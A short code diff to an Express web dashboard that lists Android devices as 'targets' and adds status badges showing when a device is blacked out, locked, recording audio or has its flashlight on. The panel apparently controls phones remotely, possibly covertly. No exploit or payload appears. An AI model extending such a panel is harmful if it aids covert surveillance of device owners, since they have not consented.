@@ -444,6 +444,13 @@ app.get('/', (req, res) => {
                 statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
             }
 
+            const activeTags = [];
+            if (d.blackout) activeTags.push('<span style="color:var(--neon-green); font-size:0.58rem; background:rgba(57,255,20,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-green);">🕶️ BLACKOUT</span>');
+            if (d.locked) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🔒 LOCKED</span>');
+            if (d.recording) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🎙️ REC</span>');
+            if (d.flashlight) activeTags.push('<span style="color:var(--neon-yellow); font-size:0.58rem; background:rgba(255,255,0,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-yellow);">🔦 LIGHT</span>');
+            const indicatorsHtml = activeTags.length > 0 ? `<div style="display:flex; gap:4px; margin-top:4px; flex-wrap:wrap;">${activeTags.join('')}</div>` : '';
+
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -451,6 +458,7 @@ app.get('/', (req, res) => {
                         <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
                         <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
                     </div>
+                    ${indicatorsHtml}
                 </td>
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
